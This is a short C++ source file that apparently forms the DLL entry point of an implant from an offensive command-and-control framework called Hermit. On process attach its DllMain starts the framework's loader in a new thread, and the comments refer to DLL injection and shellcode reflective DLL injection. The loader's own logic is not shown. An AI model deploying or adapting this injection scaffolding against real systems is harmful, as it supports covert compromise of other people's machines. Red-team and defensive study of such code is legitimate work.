#include "hermit.hpp"

#define MAX_THREADS 3

DWORD WINAPI RunWrapper(LPVOID lpParam)
{
    Hermit::DLLLoader();

    return 0;
}

DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread = NULL;

    switch (fdwReason)
    {
        case DLL_QUERY_HMODULE:
            break;
        case DLL_PROCESS_ATTACH:
            #ifdef IS_SHELLCODE
            RunWrapper(nullptr);
            #else
            // Execute the Run function within a new thread
            // because WinHTTP functions are not usable in DllMain when DLL Injection.
            hThread = CreateThread(
                NULL,
                0,
                RunWrapper,
                hinstDLL,
                0,
                NULL
            );
            #endif

            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

#ifdef IS_SHELLCODE
// This function is called for sRDI (Shellcode Reflective DLL Injection)
// But currently this is not used actually...
DLLEXPORT BOOL Start(LPVOID lpArg, DWORD dwArgLen)
{
    // MessageBoxA(NULL, "Start", "Start", MB_OK);
    return TRUE;
}
#endif // IS_SHELLCODE